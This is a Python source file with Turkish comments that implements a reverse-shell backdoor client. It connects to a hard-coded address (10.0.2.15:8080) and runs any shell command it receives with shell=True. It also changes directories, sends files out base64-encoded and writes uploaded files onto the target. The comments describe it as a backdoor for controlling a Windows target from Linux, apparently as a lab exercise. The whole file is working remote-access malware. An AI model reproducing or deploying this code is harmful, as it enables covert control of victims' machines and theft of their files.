import socket           # Backdoor için önce hedefle bağlantı kurmak için bir soket tanımlanır. Sonra da o bağlantıyı dinlemek için bir listener. Biz şuan soket tanımlıyoruz bu kütüphaneyle.
import subprocess       # Çalıştırılan komutun sonucunu tutmak için kullanıyoruz.
import simplejson       # Komut çalıştırdığımızda gelen verileri paket şeklinde yani tüm olarak alabilmeyi ve verileri düzgün, okunabilir şekilde vermeyi sağlıyor. Ve python3 uyumu için binary.
import os               # cd komutunu kullanmamıza, istediğimiz klasöre bu komut ile gitmemizi sağlamaya yarıyor.
import base64           # txt dosyası harici, içinde binary'nin okuyamadığı özel harfler bulunduran resim, program gibi dosyaların makine diline çevrilip okunmasını ve indirilmesini sağlar.

class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # Soket bağlantısını kurduk af_inet kaynak ip(linux ip), sock_stream ise kullanılacak port için kullanılıyor.
		self.my_connection.connect((ip,port))                                  # Burada da zaten yukarıda tanımladığımız ip ve portu yazıyoruz.

	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)                    # call fonksiyonu komutu çalıştırma amaçlı ancak check_output komutun sonucunu tutup istediğimizde veriyor bize
                                                                               # bunu reverse shell için yani komutu windows'da çalıştırıp linuxda sonucunu görmek için yapıyoruz.
	def json_send(self, data):
		json_data = simplejson.dumps(data)                                     # Veriyi json formatına çeviriyoruz. Encrypted ettik gibi düşün.
		self.my_connection.send(json_data.encode("utf-8"))                     # Python3 uyumu için gönderdiğimiz veriyi utf-8 ile encode ettik. Yoksa her yazdığımız komutta hata veriyor.

	def json_receive(self):
		json_data = ""
		while True:    # json formatında veriyi aldığımız için tek bir paket alıp paketi aldıktan sonra hata veriyor. Tüm paketleri almak için txt içindekiler bitene kadar sonsuz loop'a soktuk.
			try:
				json_data = json_data + self.my_connection.recv(1024).decode() # 1024 kısmı, alınan en fazla byte'ı temsil ediyor. decode kısmı, python3 için utf-8 binarysini decode etmek için.
				return simplejson.loads(json_data)                             # Veriyi json formatından normal formata çevirip decrypted ettik gibi düşün.
			except ValueError:                                                 # Hata verirse programı kapatma devam et demek.
				continue

	def execute_cd_command(self,directory):
		os.chdir(directory)                        # os.chdir, cd komutunu kullanmamızı ve hangi klasöre bizi ulaştırması gerektiğini alıp bizi o klasöre ulaştırıyor.
		return "Cd to " + directory

	def get_file_contents(self,path):           # Dosyaları indirmemiz için okumamız gerekiyor. Ama sadece txt dosyalarını okuyup indirmeyeceğimizden binary kullanmamız gerekiyor.
		with open(path,"rb") as my_file:        # Bunun için "rb" yazıyoruz. Bu bir program olabilir, resim olabilir. Ancak bunu makine diline çevirip okuyup indirebililir.
			return base64.b64encode(my_file.read()) # base64.b64encode; resim, program gibi dosyaların içindeki özel harflerin çözümlenip, okunmasını ve böylece indirilmesini sağlar.

	def save_file(self,path,content):            # Burada get_file'den farklı olarak content'in olmasının amacı, içinde o dosyanın binary kodunu içerecek olması ve bunu content ile belirtmemiz.
		with open(path,"wb") as my_file:         # save_file kısmı ise kaynak pcden hedef pc'ye bir dosya yükleme kısmıdır.
			my_file.write(base64.b64decode(content))# Burada da kendi makinemiden hedef makineye bir şey gönderiyor ve content kısmı binary kodu içerdiğinden b64decode özelliğini kullanıyoruz. 
			return "Download OK"

	def start_socket(self):
		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:  # cd komutu varsa ve komuttaki kelime sayısı 1'den yüksekse anlamına gelir.1'in sebebi diğer kelimenin gidilecek dosya adı olması.
					command_output = self.execute_cd_command(command[1]) # command[1] cd'den sonraki kısım yani gidilecek klasör ismi veya .. kısmını içeriyor. Örn: cd Downloads
				elif command[0] == "download":
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload":
					command_output = self.save_file(command[1],command[2]) # save file kısmında content kısmı da olduğu için command[2] kısmı yazılacak içeriği içeriyor.
				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error!" # cd, download, upload gibi bilinmedik bir input girilmişse örn eren gibi; programın direk kapanmamasını, error yazdırmasını ve devam etmesini sağlıyor.
			self.json_send(command_output)
		self.my_connection.close()

my_socket_object = MySocket("10.0.2.15",8080)
my_socket_object.start_socket()